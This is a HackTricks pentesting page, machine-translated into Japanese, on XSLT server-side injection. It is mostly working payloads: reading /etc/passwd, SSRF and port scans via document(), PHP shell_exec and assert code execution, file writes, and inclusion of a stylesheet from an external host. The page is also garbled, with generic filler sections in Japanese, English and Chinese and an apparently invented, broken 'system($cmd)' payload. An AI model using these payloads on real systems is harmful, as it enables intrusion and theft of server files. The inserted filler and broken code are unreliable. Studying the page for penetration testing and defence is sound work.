# XSLTサーバーサイドインジェクション（Extensible Stylesheet Language Transformations）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

XMLドキュメントを別の形式に変換するために使用されます。バージョン：1、2、および3（1が最も使用されています）。
変換はサーバーまたはブラウザで行うことができます。

最も使用されるフレームワークは、**Libxslt**（Gnome）、**Xalan**（Apache）、および**Saxon**（Saxonica）です。

この種の脆弱性を悪用するには、サーバーサイドにxslタグを保存し、そのコンテンツにアクセスできる必要があります。この種の脆弱性の例は、[https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)で見つけることができます。

## 例 - チュートリアル
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

実行する：
```markup
$ saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### フィンガープリント

{% code title="detection.xsl" %}
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

そして実行します。
```markup
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### ローカルファイルの読み取り

{% code title="read.xsl" %}
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```markup
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

SSRF（Server-Side Request Forgery）は、攻撃者がアプリケーション内のサーバー側でリクエストを送信する脆弱性です。攻撃者は、アプリケーションが信頼する他のサーバーにリクエストを送信することができます。これにより、攻撃者は内部ネットワークへのアクセスや、外部サービスへの攻撃を行うことができます。

SSRFの攻撃手法には、次のようなものがあります。

- リクエストの送信先を制御することができるパラメータの悪用
- リクエストの送信先を指定するためのURLの構築
- リクエストの送信先を指定するためのヘッダーの悪用

SSRF攻撃を防ぐためには、以下の対策を実施する必要があります。

- 入力検証とフィルタリングを行い、信頼できないURLをブロックする
- 内部ネットワークへのアクセスを制限する
- セキュリティパッチを適用し、脆弱性を修正する

SSRF攻撃は重大なセキュリティリスクであるため、開発者やシステム管理者は常に注意を払う必要があります。
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### バージョン

使用されているXSLTバージョンによって、関数の数は増減する場合があります：

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## フィンガープリント

これをアップロードして情報を取得してください
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

SSRF（Server-Side Request Forgery）は、攻撃者がアプリケーション内のサーバー側でリクエストを送信する脆弱性です。攻撃者は、内部ネットワークへのアクセスや外部サービスへの攻撃を行うために、アプリケーションが信頼するリソースにリクエストを送信することができます。

SSRF攻撃は、以下のような方法で実行されることがあります。

1. ユーザーが入力するURLを使用して、アプリケーションが外部リソースにリクエストを送信する場合、攻撃者は任意のURLを指定することができます。
2. アプリケーションがローカルファイルにアクセスするために使用するURLを攻撃者が制御できる場合、攻撃者は機密情報を取得するためにローカルファイルにアクセスすることができます。
3. アプリケーションが内部ネットワークのリソースにアクセスするために使用するURLを攻撃者が制御できる場合、攻撃者は内部ネットワークにアクセスすることができます。

SSRF攻撃を防ぐためには、以下の対策を実施することが重要です。

1. 入力検証とフィルタリングを行い、信頼できるリソースへのリクエストのみを許可します。
2. ホワイトリストを使用して、許可されたURLのみをアプリケーションが使用するようにします。
3. リクエストを送信する前に、URLを正規化し、不正なリクエストを防ぎます。

SSRF攻撃は、アプリケーションのセキュリティに重大な脅威となります。適切な対策を実施することで、この脆弱性を防ぐことができます。
```markup
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## Javascriptのインジェクション

Javascriptのインジェクションは、ウェブアプリケーションの脆弱性を悪用して、攻撃者が任意のJavascriptコードを実行できるようにする攻撃手法です。この攻撃は、ウェブアプリケーションがユーザーからの入力を適切に検証せずに直接実行する場合に発生します。

攻撃者は、ウェブアプリケーションに対して悪意のあるJavascriptコードを送信することで、ユーザーのブラウザ上でそのコードを実行させることができます。これにより、攻撃者はユーザーのセッション情報を盗み出したり、不正な操作を行ったりすることができます。

Javascriptのインジェクションを防ぐためには、入力検証とエスケープ処理を適切に行う必要があります。入力検証は、ユーザーからの入力が予期しない形式である場合にエラーを返すことで、攻撃を防ぐ役割を果たします。エスケープ処理は、ユーザーからの入力を安全な形式に変換することで、悪意のあるコードの実行を防ぎます。

Javascriptのインジェクションは、ウェブアプリケーションのセキュリティに深刻な脅威をもたらす可能性があるため、開発者は常にセキュリティ対策を意識してコーディングする必要があります。
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## ディレクトリリスト（PHP）

### **Opendir + readdir**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

This technique is used to perform Server-Side Injection (SSI) using the Extensible Stylesheet Language Transformations (XSLT) feature. It involves injecting malicious code into an XSLT stylesheet file to execute arbitrary commands on the server.

#### **Attack Scenario**

1. Identify a vulnerable application that uses XSLT for server-side processing.
2. Locate the XSLT stylesheet file used by the application.
3. Inject malicious code into the XSLT stylesheet file.
4. Craft the payload to execute the desired command on the server.
5. Trigger the XSLT transformation process to execute the payload.
6. Retrieve the output of the executed command.

#### **Payload**

The payload for this technique can vary depending on the specific command you want to execute. However, the general structure of the payload is as follows:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="cmd" select="your_command_here"/>
        <xsl:variable name="output" select="system($cmd)"/>
        <xsl:value-of select="$output"/>
    </xsl:template>
</xsl:stylesheet>
```

Replace `your_command_here` with the command you want to execute. For example, to list the contents of a directory using the `scandir` function in PHP, you can use the following payload:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="cmd" select="php:function('scandir', '.')"/>
        <xsl:variable name="output" select="system($cmd)"/>
        <xsl:value-of select="$output"/>
    </xsl:template>
</xsl:stylesheet>
```

#### **Prevention**

To prevent XSLT Server-Side Injection, follow these best practices:

- Validate and sanitize all user input before using it in XSLT transformations.
- Use a whitelist approach to only allow specific XSLT functions and features.
- Implement proper input/output encoding to prevent injection attacks.
- Regularly update and patch the XSLT processor to mitigate known vulnerabilities.

By following these preventive measures, you can significantly reduce the risk of XSLT Server-Side Injection attacks.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
## ファイルの読み取り

### **内部 - PHP**
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **内部 - XXE**

XXE（外部实体注入）是一种攻击技术，利用了XML解析器的漏洞，允许攻击者读取服务器上的文件、执行远程请求和进行其他恶意操作。在内部渗透测试中，XXE可以用于获取敏感信息、发起攻击链或进一步探测目标系统。

#### **1. 检测XXE漏洞**

要检测目标系统是否存在XXE漏洞，可以尝试以下方法：

- 发送带有外部实体引用的XML请求，观察是否返回了敏感信息。
- 尝试使用已知的XXE漏洞利用工具，如XXEinjector或Burp Suite的XXE漏洞扫描器。

#### **2. 利用XXE漏洞**

一旦确认目标系统存在XXE漏洞，可以尝试以下利用方法：

- 读取敏感文件：通过在XML请求中引用外部实体，可以读取服务器上的敏感文件，如/etc/passwd。
- 执行远程请求：利用XXE漏洞，可以发送远程请求，如SSRF（服务器端请求伪造）攻击，从而进一步探测目标系统或攻击内部资源。
- 发起攻击链：通过利用XXE漏洞，可以在目标系统上执行恶意代码，如反序列化攻击或远程命令执行。

#### **3. 防御XXE漏洞**

为了防止XXE漏洞的利用，可以采取以下防御措施：

- 输入验证和过滤：对用户输入的XML数据进行严格验证和过滤，确保不包含外部实体引用。
- 使用安全的XML解析器：使用安全的XML解析器，如DOM4J或JAXB，以防止XXE漏洞的利用。
- 禁用外部实体：在XML解析器中禁用外部实体，以防止XXE漏洞的利用。

#### **4. 相关工具和资源**

以下是一些有用的工具和资源，可用于检测和利用XXE漏洞：

- XXEinjector：用于检测和利用XXE漏洞的工具。
- Burp Suite：一款功能强大的Web应用程序渗透测试工具，包含XXE漏洞扫描器。
- OWASP XXE Prevention Cheat Sheet：OWASP提供的防御XXE漏洞的参考指南。

#### **5. 总结**

XXE是一种利用XML解析器漏洞的攻击技术，可以用于读取敏感文件、执行远程请求和发起攻击链。为了防止XXE漏洞的利用，应采取适当的防御措施，如输入验证和过滤，使用安全的XML解析器以及禁用外部实体。
```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **HTTPを介して**

When performing XSLT Server-Side Injection (XSSI) attacks, one common method is to exploit the XSLT processor by sending a specially crafted XML payload through an HTTP request. This allows an attacker to inject malicious code into the server-side XSLT stylesheet and manipulate the transformation process.

XSLT is a language used for transforming XML documents into other formats, such as HTML or plain text. It allows developers to define rules and templates to transform the XML data. However, if the XSLT processor is not properly configured or secured, it can be vulnerable to injection attacks.

To perform an XSSI attack through HTTP, the attacker needs to identify a vulnerable endpoint that accepts XML input and processes it using an XSLT stylesheet. The attacker then crafts a malicious XML payload that includes the XSLT code they want to inject.

The payload is sent as part of an HTTP request, typically using the POST method. The XML payload is included in the request body, and the Content-Type header is set to "application/xml" or "text/xml" to indicate that the request contains XML data.

Once the server receives the request, it processes the XML payload using the XSLT processor. If the server is vulnerable to XSSI, it will execute the injected XSLT code, allowing the attacker to perform various actions, such as reading sensitive data, executing arbitrary commands, or even gaining remote code execution.

It is important to note that XSSI attacks through HTTP require the server to have an XSLT processor enabled and vulnerable to injection. Additionally, the attacker needs to have knowledge of the server's configuration and the ability to craft a malicious XML payload.

To protect against XSSI attacks, it is crucial to properly configure and secure the XSLT processor. This includes validating and sanitizing user input, restricting access to sensitive resources, and implementing proper input validation and output encoding techniques. Regular security assessments and penetration testing can help identify and mitigate potential vulnerabilities.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **内部（PHP関数）**

The internal (PHP-function) technique allows an attacker to execute arbitrary code on the server by injecting malicious code into an XSLT stylesheet file. This technique takes advantage of the server-side processing capabilities of XSLT (Extensible Stylesheet Language Transformations) to execute code on the server.

To perform an XSLT server-side injection, the attacker needs to identify a vulnerable application that uses XSLT to transform XML data. Once a vulnerable application is identified, the attacker can craft a malicious XSLT stylesheet file that contains the code they want to execute.

The attacker then injects the malicious XSLT stylesheet file into the vulnerable application by exploiting a vulnerability that allows file uploads or by modifying an existing stylesheet file. When the application processes the XML data and applies the XSLT transformation, it also executes the injected code.

This technique can be used to perform various malicious actions, such as accessing sensitive data, modifying server-side files, or even gaining remote code execution on the server. It is important for developers to properly validate and sanitize user input when using XSLT to prevent this type of attack.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### ポートスキャン

ポートスキャンは、ネットワーク上の特定のホストに対して、利用可能なポートを特定するために行われる手法です。ポートスキャンは、セキュリティ評価や侵入テストの一環として使用されます。ポートスキャンによって、ネットワーク上のホストがどのようなサービスを提供しているかを特定することができます。これにより、攻撃者は脆弱性を見つけて悪用する可能性があります。

ポートスキャンは、さまざまな方法で実行することができます。最も一般的な方法は、TCPまたはUDPパケットを送信して、ホストが応答するかどうかを確認することです。ポートスキャンの結果に基づいて、攻撃者はホスト上で実行されているサービスやアプリケーションの情報を収集することができます。

ポートスキャンは、ネットワークセキュリティの評価や侵入テストにおいて重要な手法ですが、悪意のある攻撃にも使用されることがあります。そのため、ポートスキャンの実施は、適切な許可を得た場合にのみ行われるべきです。また、ポートスキャンの結果を適切に評価し、必要な対策を講じることも重要です。
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## ファイルへの書き込み

### XSLT 2.0

XSLT 2.0では、`xsl:result-document`要素を使用してファイルに書き込むことができます。この要素は、指定したファイルに結果を出力するために使用されます。

以下は、XSLT 2.0を使用してファイルに書き込むための例です。

```xml
<xsl:result-document href="file:///path/to/file.txt">
  <xsl:text>Hello, World!</xsl:text>
</xsl:result-document>
```

上記の例では、`file:///path/to/file.txt`というパスに`Hello, World!`というテキストを書き込んでいます。

この方法を使用すると、XSLT 2.0を介してファイルにデータを書き込むことができます。ただし、この機能を使用する際には、セキュリティ上の注意が必要です。悪意のあるユーザーが不正なファイルパスを指定することで、システムに悪影響を与える可能性があります。そのため、信頼できる入力を使用するか、適切な入力検証とエスケープ処理を行うことが重要です。
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-Jの拡張機能**

Xalan-Jは、Javaで実装されたXSLT（Extensible Stylesheet Language Transformations）プロセッサです。XSLTは、XML文書を別の形式に変換するための言語です。Xalan-Jには、XSLTの機能を拡張するためのいくつかの拡張機能があります。

Xalan-Jの拡張機能を使用することで、XSLTスタイルシート内でJavaのクラスやメソッドを呼び出すことができます。これにより、XSLTの処理中に任意のJavaコードを実行することができます。

Xalan-Jの拡張機能を悪用すると、サーバーサイドインジェクション（SSI）攻撃を実行することができます。攻撃者は、XSLTスタイルシート内に悪意のあるコードを埋め込むことで、サーバー上で任意のコマンドを実行することができます。

Xalan-Jの拡張機能を使用したサーバーサイドインジェクション攻撃は、セキュリティ上の脆弱性として認識されています。開発者は、Xalan-Jの拡張機能を適切に制限し、入力の検証とエスケープ処理を行うことで、この攻撃を防ぐ必要があります。
```markup
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
他の方法でPDFファイルに書き込む

## 外部XSLを含める
```markup
<xsl:include href="http://extenal.web/external.xsl"/>
```

```markup
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## コードの実行

### **php:function**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
他のフレームワークを使用してPDFでコードを実行する

### **他の言語**

**このページでは、他の言語でのRCEの例を見つけることができます：** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C＃、Java、PHP)**

## **クラスからPHPの静的関数にアクセスする**

次の関数は、クラスXSLの静的メソッド`stringToUrl`を呼び出します：
```markup
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
## **Brute-Force Detection List**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **References**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するために、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
